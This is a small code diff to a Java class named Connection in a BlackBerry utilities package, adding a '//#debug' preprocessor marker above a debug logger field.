@@ -18,6 +18,7 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public abstract class Connection {
+	//#debug
     protected static Debug debug = new Debug("Connection", DebugLevel.VERBOSE);
 
     protected DataInputStream in;
